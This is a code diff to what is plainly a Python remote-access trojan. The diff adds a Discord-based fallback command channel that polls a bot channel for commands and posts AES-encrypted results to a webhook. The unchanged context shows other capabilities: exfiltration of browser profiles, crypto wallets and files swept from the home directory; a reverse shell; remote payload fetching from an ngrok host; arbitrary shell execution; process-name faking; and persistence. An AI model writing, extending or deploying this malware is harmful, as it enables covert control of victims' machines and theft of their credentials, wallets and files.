@@ -2,8 +2,9 @@
 import socket, subprocess, base64, time, urllib.request, os, threading
 from Cryptodome.Cipher import AES
 from Cryptodome.Random import get_random_bytes
-import zipfile, tempfile, shutil, sys
+import zipfile, tempfile, shutil, sys, json
 
+# === Config ===
 SECRET_KEY = b'Sixteen byte key'
 EXFIL_KEY = b'magicRogueKey!'
 C2_HOST = 'YOUR.C2.IP.HERE'
@@ -12,6 +13,11 @@ EXFIL_PORT = 9090
 PAYLOAD_REPO = "https://abc123.ngrok.io/"
 HIDDEN_DIR = os.path.expanduser("~/.cache/.rogue")
 os.makedirs(HIDDEN_DIR, exist_ok=True)
+
+# === Optional Discord Fallback C2 ===
+DISCORD_COMMAND_URL = "https://discord.com/api/v10/channels/YOUR_CHANNEL_ID/messages?limit=1"
+DISCORD_WEBHOOK = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID"
+BOT_TOKEN = "YOUR_DISCORD_BOT_TOKEN"
 
 def encrypt_response(msg):
     cipher = AES.new(SECRET_KEY, AES.MODE_EAX)
@@ -77,7 +83,6 @@ def exfiltrate_data(path):
                     zip_directory(p, zipf, base=os.path.basename(p))
             else:
                 zip_directory(path, zipf)
-
         encrypted_blob = encrypt_file(zip_path)
         os.remove(zip_path)
 
@@ -123,8 +128,6 @@ def handle_trigger(cmd):
             os.path.expanduser("~/.config/BraveSoftware"),
             os.path.expanduser("~/.wallets"),
         ]
-
-        # Optional: wildcard grep for .kdbx, .sqlite, .json, .zip
         home = os.path.expanduser("~")
         for root, _, files in os.walk(home):
             for file in files:
@@ -132,8 +135,7 @@ def handle_trigger(cmd):
                     targets.append(os.path.join(root, file))
         return exfiltrate_data(targets)
 
-        elif cmd == "trigger_stealthinject":
-        print("[*] Running memory-only polyloader...")
+    elif cmd == "trigger_stealthinject":
         path = os.path.join(HIDDEN_DIR, "polyloader.py")
         if not os.path.exists(path):
             if not fetch_payload("polyloader.py"):
@@ -164,18 +166,14 @@ def handle_command(cmd):
             return f"[+] Fetched {name}"
         else:
             return f"[!] Failed to fetch {name}"
-
     elif cmd.startswith("run_payload"):
         _, name = cmd.split()
         return run_payload(name)
-
     elif cmd.startswith("trigger_"):
         return handle_trigger(cmd) or "[!] Trigger failed"
-
     elif cmd == "reverse_shell":
         threading.Thread(target=reverse_shell).start()
         return "[*] Reverse shell started"
-
     return subprocess.getoutput(cmd)
 
 def connect():
@@ -190,6 +188,41 @@ def connect():
                 s.send(encrypt_response(result))
         except:
             time.sleep(5)
+
+# === Discord C2 Logic ===
+def check_discord_command():
+    try:
+        headers = {"Authorization": f"Bot {BOT_TOKEN}"}
+        req = urllib.request.Request(DISCORD_COMMAND_URL, headers=headers)
+        response = urllib.request.urlopen(req).read().decode()
+        latest = json.loads(response)[0]["content"]
+        return latest
+    except:
+        return None
+
+def send_to_webhook(content):
+    try:
+        req = urllib.request.Request(
+            DISCORD_WEBHOOK,
+            data=json.dumps({"content": content}).encode(),
+            headers={"Content-Type": "application/json"},
+            method="POST"
+        )
+        urllib.request.urlopen(req)
+    except:
+        pass
+
+def discord_loop():
+    print("[+] Discord beacon active")
+    last_cmd = ""
+    while True:
+        cmd = check_discord_command()
+        if cmd and cmd != last_cmd:
+            result = handle_command(cmd)
+            encrypted = encrypt_response(result)
+            send_to_webhook(encrypted.decode())
+            last_cmd = cmd
+        time.sleep(30)
 
 def fake_name():
     try:
@@ -219,8 +252,10 @@ def p2p_broadcast_ping():
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
     sock.sendto(b"Rogue?", ('<broadcast>', 7007))
 
+# === Start Everything ===
 threading.Thread(target=p2p_fallback_listener, daemon=True).start()
 threading.Thread(target=p2p_broadcast_ping, daemon=True).start()
+threading.Thread(target=discord_loop, daemon=True).start()
 
 fake_name()
 setup_persistence()
